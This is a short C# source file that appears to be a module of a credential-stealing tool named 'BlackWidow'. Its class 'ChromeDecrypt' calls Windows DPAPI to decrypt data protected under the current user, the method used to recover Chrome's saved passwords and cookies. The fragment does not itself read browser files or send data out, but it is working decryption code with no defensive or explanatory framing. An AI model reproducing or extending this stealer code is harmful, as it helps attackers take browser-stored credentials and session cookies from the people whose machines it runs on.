using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace BlackWidow.Module
{
    class ChromeDecrypt
    {
        public static string Decrypt(string EncryptedData)
        {
            if (EncryptedData == null || EncryptedData.Length == 0)
            {
                return null;
            }
            byte[] bytes = ProtectedData.Unprotect(Encoding.Default.GetBytes(EncryptedData), null, DataProtectionScope.CurrentUser);
            return Encoding.UTF8.GetString(bytes);
        }
    }
}
